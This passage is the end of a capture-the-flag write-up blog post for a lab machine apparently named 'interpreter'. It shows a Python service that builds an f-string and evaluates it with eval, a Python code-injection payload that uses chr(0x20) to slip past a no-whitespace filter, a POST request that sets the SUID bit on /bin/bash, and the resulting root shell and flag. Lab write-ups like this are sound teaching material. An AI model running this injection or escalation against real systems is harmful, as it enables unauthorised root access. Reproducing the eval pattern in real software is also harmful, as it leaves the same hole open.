+<span class="mtk7 mtki">def</span> <span class="mtk8">template</span><span class="mtk1">(</span><span class="mtk9 mtki">first</span><span class="mtk1">, </span><span class="mtk9 mtki">last</span><span class="mtk1">, </span><span class="mtk9 mtki">sender</span><span class="mtk1">, </span><span class="mtk9 mtki">ts</span><span class="mtk1">, </span><span class="mtk9 mtki">dob</span><span class="mtk1">, </span><span class="mtk9 mtki">gender</span><span class="mtk1">):</span>
+    <span class="mtk1">pattern</span> <span class="mtk5">=</span> <span class="mtk8 mtku">re</span><span class="mtk1">.</span><span class="mtk8">compile</span><span class="mtk1">(</span><span class="mtk7 mtki">r</span><span class="mtk4">"^</span><span class="mtk6">[a-zA-Z0-9._'\"(){}=+/]</span><span class="mtk5">+</span><span class="mtk4">$"</span><span class="mtk1">)</span>
+    <span class="mtk5">for</span> <span class="mtk1">s</span> <span class="mtk5">in</span><span class="mtk1"> [</span><span class="mtk9 mtki">first</span><span class="mtk1">, </span><span class="mtk9 mtki">last</span><span class="mtk1">, </span><span class="mtk9 mtki">sender</span><span class="mtk1">, </span><span class="mtk9 mtki">ts</span><span class="mtk1">, </span><span class="mtk9 mtki">dob</span><span class="mtk1">, </span><span class="mtk9 mtki">gender</span><span class="mtk1">]:</span>
+        <span class="mtk5">if</span> <span class="mtk5">not</span> <span class="mtk1">pattern</span><span class="mtk1">.</span><span class="mtk8">fullmatch</span><span class="mtk1">(</span><span class="mtk1">s</span><span class="mtk1">):</span>
+            <span class="mtk5">return</span> <span class="mtk4">"[INVALID_INPUT]"</span>
+    <span class="mtk3"># DOB format is DD/MM/YYYY</span>
+    <span class="mtk5">try</span><span class="mtk1">:</span>
+        <span class="mtk1">year_of_birth</span> <span class="mtk5">=</span> <span class="mtk7 mtki">int</span><span class="mtk1">(</span><span class="mtk9 mtki">dob</span><span class="mtk1">.</span><span class="mtk1">split</span><span class="mtk1">(</span><span class="mtk4">'/'</span><span class="mtk1">)[</span><span class="mtk5">-</span><span class="mtk6">1</span><span class="mtk1">])</span>
+        <span class="mtk5">if</span> <span class="mtk1">year_of_birth</span> <span class="mtk5">&lt;</span> <span class="mtk6">1900</span> <span class="mtk5">or</span> <span class="mtk1">year_of_birth</span> <span class="mtk5">&gt;</span> <span class="mtk8 mtku">datetime</span><span class="mtk1">.</span><span class="mtk8">now</span><span class="mtk1">().</span><span class="mtk1">year</span><span class="mtk1">:</span>
+            <span class="mtk5">return</span> <span class="mtk4">"[INVALID_DOB]"</span>
+    <span class="mtk5">except</span><span class="mtk1">:</span>
+        <span class="mtk5">return</span> <span class="mtk4">"[INVALID_DOB]"</span>
+    <span class="mtk1">template</span> <span class="mtk5">=</span> <span class="mtk7 mtki">f</span><span class="mtk4">"Patient </span><span class="mtk6">{</span><span class="mtk9 mtki">first</span><span class="mtk6">}</span><span class="mtk4"> </span><span class="mtk6">{</span><span class="mtk9 mtki">last</span><span class="mtk6">}</span><span class="mtk4"> (</span><span class="mtk6">{</span><span class="mtk9 mtki">gender</span><span class="mtk6">}</span><span class="mtk4">), </span><span class="mtk6">{</span><span class="mtk6">{</span><span class="mtk4">datetime.now().year - year_of_birth</span><span class="mtk6">}}</span><span class="mtk4"> years old, received from </span><span class="mtk6">{</span><span class="mtk9 mtki">sender</span><span class="mtk6">}</span><span class="mtk4"> at </span><span class="mtk6">{</span><span class="mtk9 mtki">ts</span><span class="mtk6">}</span><span class="mtk4">"</span>
+    <span class="mtk5">try</span><span class="mtk1">:</span>
+        <span class="mtk5">return</span> <span class="mtk7">eval</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">"f'''</span><span class="mtk6">{</span><span class="mtk1">template</span><span class="mtk6">}</span><span class="mtk4">'''"</span><span class="mtk1">)</span>
+    <span class="mtk5">except</span> <span class="mtk7 mtki">Exception</span> <span class="mtk5">as</span> <span class="mtk1">e</span><span class="mtk1">:</span>
+        <span class="mtk5">return</span> <span class="mtk7 mtki">f</span><span class="mtk4">"[EVAL_ERROR] </span><span class="mtk6">{</span><span class="mtk1">e</span><span class="mtk6">}</span><span class="mtk4">"</span>
+</pre></code></div><button class="copy-code-btn" aria-label="Copy code">
+<svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-copy"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"/></svg></button></div><p>First, there is a RegEx pattern that only allows some characters. The allow-list is pretty loose, even though we can&rsquo;t use whitespaces. Then the birth date check is easy to pass. Finally, there is a template created as an f-string and evaluated with <code>eval</code>. This is very dangerous because we caninject arbitrary Python code.</p><p>For instance, we can do somethine like:</p><div class="highlight" data-pagefind-ignore="all"><code class="ma0 pa0 white"><pre class="cconsole" tabindex="0">
+<span class="code-cyan">$</span> <span class="code-dark-green">python3</span> -q
+<span class="code-magenta">&gt;&gt;&gt; </span><span class="code-blue">from</span> datetime <span class="code-blue">import</span> datetime
+<span class="code-magenta">&gt;&gt;&gt; </span><span class="code-blue">import</span> os
+<span class="code-magenta">&gt;&gt;&gt; </span>
+<span class="code-magenta">&gt;&gt;&gt; </span>last = <span class="code-dark-green">'a'</span>
+<span class="code-magenta">&gt;&gt;&gt; </span>gender = <span class="code-dark-green">'b'</span>
+<span class="code-magenta">&gt;&gt;&gt; </span>year_of_birth = <span class="code-dark-yellow">2026</span>
+<span class="code-magenta">&gt;&gt;&gt; </span>sender = <span class="code-dark-green">'c'</span>
+<span class="code-magenta">&gt;&gt;&gt; </span>ts = <span class="code-dark-yellow">1</span>
+<span class="code-magenta">&gt;&gt;&gt; </span>
+<span class="code-magenta">&gt;&gt;&gt; </span>first = <span class="code-dark-green">'{os.system("whoami")}'</span>
+<span class="code-magenta">&gt;&gt;&gt; </span>
+<span class="code-magenta">&gt;&gt;&gt; </span>template = <span class="code-dark-green">f"Patient </span>{first}<span class="code-dark-green"> </span>{last}<span class="code-dark-green"> (</span>{gender}<span class="code-dark-green">), {{datetime.now().year - year_of_birth}} years old, received from </span>{sender}<span class="code-dark-green"> at </span>{ts}<span class="code-dark-green">"</span>
+<span class="code-magenta">&gt;&gt;&gt; </span>
+<span class="code-magenta">&gt;&gt;&gt; </span><span class="code-dark-cyan">eval</span>(<span class="code-dark-green">f"f'''</span>{template}<span class="code-dark-green">'''"</span>)
+rocky
+'Patient 0 a (b), 0 years old, received from c at 1'
+</pre></code></div><p>The above <code>eval</code> has called <code>os.system("whoami")</code> and printed the result. This has worked because there is an inner f-string evaluation, so the below string is interpolated as an f-string:</p><div class="highlight" data-pagefind-ignore="all"><code class="ma0 pa0 white"><pre class="cconsole" tabindex="0">
+<span class="code-magenta">&gt;&gt;&gt; </span><span class="code-dark-cyan">print</span>(template)
+Patient {os.system("whoami")} a (b), {datetime.now().year - year_of_birth} years old, received from c at 1
+</pre></code></div><p>With this we can escalate our privileges, for instance setting Bash to have the SUID bit set. For this, we need to run <code>chmod 4755 /bin/bash</code>, but we cannot use whitespaces. To bypass this restriction, we can use string concatenation in Python and <code>chr(0x20)</code> as a whitespace.</p><p>This will be the final payload:</p><div class="highlight" data-pagefind-ignore="all"><code class="ma0 pa0 white"><pre class="cconsole" tabindex="0">
+<span class="code-green">sedric@interpreter</span>:<span class="code-blue">~</span>$ ls -l /bin/bash
+-rwxr-xr-x 1 root root 1265648 Sep  6 18:07 <span class="code-green">/bin/bash</span>
+<span class="code-green">sedric@interpreter</span>:<span class="code-blue">~</span>$ wget 127.0.0.1:54321/addPatient --method=POST --header='Content-Type: application/xml' \
+> --body-data='&lt;patient&gt;&lt;firstname&gt;{os.system("chmod"+chr(0x20)+"4755"+chr(0x20)+"/bin/bash")}&lt;/firstname&gt;&lt;lastname&gt;a&lt;/lastname&gt;&lt;sender_app&gt;b&lt;/sender_app&gt;&lt;timestamp&gt;1&lt;/timestamp&gt;&lt;birth_date&gt;2025&lt;/birth_date&gt;&lt;gender&gt;c&lt;/gender&gt;&lt;/patient&gt;'
+--2026-02-26 12:05:35--  http://127.0.0.1:54321/addPatient
+Connecting to 127.0.0.1:54321... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 50 [text/html]
+Saving to: ‘addPatient’
+
+addPatient                                                  100%[=========================================================================================================================================&gt;]      50  --.-KB/s    in 0s
+
+2026-02-26 12:05:36 (5.11 MB/s) - ‘addPatient’ saved [50/50]
+
+<span class="code-green">sedric@interpreter</span>:<span class="code-blue">~</span>$ ls -l /bin/bash
+-rwsr-xr-x 1 root root 1265648 Sep  6 18:07 <span class="code-white code-bg-red">/bin/bash</span>
+</pre></code></div><p>With this, we have become <code>root</code> and now we can read the flag:</p><div class="highlight" data-pagefind-ignore="all"><code class="ma0 pa0 white"><pre class="cconsole" tabindex="0">
+<span class="code-green">sedric@interpreter</span>:<span class="code-blue">~</span>$ bash -p
+bash-5.2# cat /root/root.txt
+e23d9f9709dbb51a441daec846a52175
+</pre></code></div></section><aside aria-label="aside" class="w-20-l mt6-l" id="aside-desktop"><section id="toc" class="bg-card pa3 pb0 p-sticky" data-pagefind-ignore="all"><p class="b pb2 ma0">Contents</p><ul class="nested-list-reset nested-copy-line-height nested-links"><li><a href="#port-scanning" title="port-scanning">Port scanning</a></li><li><a href="#enumeration" title="enumeration">Enumeration</a></li><li><a href="#foothold" title="foothold">Foothold</a></li><li><a href="#system-enumeration" title="system-enumeration">System enumeration</a></li><li><a href="#lateral-movement-to-sedric" title="lateral-movement-to-sedric">Lateral movement to <code>sedric</code></a></li><li><a href="#privilege-escalation" title="privilege-escalation">Privilege escalation</a><ul><li><a href="#python-code-injection" title="python-code-injection">Python code injection</a></li></ul></li></ul><div class="pv2 white" id="bmc"><a class="pointer no-underline white" target="_blank" href="http://buymeacoffee.com/7Rocky" title="Buy me a beer">🍺&nbsp; Buy me a beer</a></div></section></aside></article></main><footer class="b-0 w-100" role="contentinfo" data-pagefind-ignore="all"><div class="bg-black w-100 pa3" role="contentinfo"><div class="flex justify-between"><a class="f5 fw5 hover-white no-underline white-70 dib-ns" href="https://7rocky.github.io/" title="https://7rocky.github.io/">&copy; 7Rocky 2026.<br>Licensed under CC BY-NC 4.0</a></div></div></footer></body></html>
